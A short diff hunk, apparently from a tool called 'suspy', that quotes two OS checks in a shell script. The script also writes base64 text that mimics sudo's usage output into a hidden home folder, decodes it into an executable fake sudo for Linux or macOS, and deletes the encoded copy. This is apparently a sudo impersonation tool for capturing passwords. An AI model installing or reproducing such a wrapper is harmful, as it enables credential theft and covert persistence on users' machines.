@@ -65,12 +65,12 @@ IFstQyBudW1dIFstZyBncm91cF0gWy1oIGhvc3RdIFstcCBwcm9tcHRdIFstdSB1c2VyXSBbVkFS
 PXZhbHVlXSBbLWl8LXNdIFs8Y29tbWFuZD5dIgplY2hvICJ1c2FnZTogc3VkbyAtZSBbLUFrblNd
 IFstciByb2xlXSBbLXQgdHlwZV0gWy1DIG51bV0gWy1nIGdyb3VwXSBbLWggaG9zdF0gWy1wIHBy
 b21wdF0gWy11IHVzZXJdIGZpbGUgLi4uIgpmaQoK" > ~/.$FOLDER_NAME/sudo_64
-if [ $OS = 'Linux' ]
+if [ "$OS" = 'Linux' ]
 then
 base64 --ignore-garbage -d ~/.$FOLDER_NAME/sudo_64 > ~/.$FOLDER_NAME/suspy
 chmod +x ~/.$FOLDER_NAME/suspy
 rm ~/.$FOLDER_NAME/sudo_64
-elif [ $OS = 'Darwin' ]
+elif [ "$OS" = 'Darwin' ]
 then
 base64 -D ~/.$FOLDER_NAME/sudo_64 > ~/.$FOLDER_NAME/suspy
 chmod +x ~/.$FOLDER_NAME/suspy
